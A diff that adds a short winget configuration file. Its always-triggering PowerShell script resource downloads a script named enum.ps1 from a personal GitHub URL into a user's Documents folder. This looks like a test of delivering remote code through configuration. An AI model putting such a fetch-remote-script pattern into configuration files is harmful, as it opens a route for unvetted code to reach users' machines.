@@ -1,0 +1,17 @@
+properties:
+  resources:
+    - resource: PSDscResources/Script
+      id: myAppConfig
+      directives:
+        description: Run Powershell Command
+        allowPrerelease: true
+      settings:
+        GetScript: |
+            #"state"
+        TestScript: |
+            return $false
+        SetScript: |
+          $url = "https://raw.githubusercontent.com/sansan-monkey/test/refs/heads/main/enum.ps1"
+          $dest = "C:\Users\ikerd\OneDrive\Documents\winget\enum.ps1"
+          Invoke-WebRequest -Uri $url -OutFile $dest -UseBasicParsing
+  configurationVersion: 0.2.0
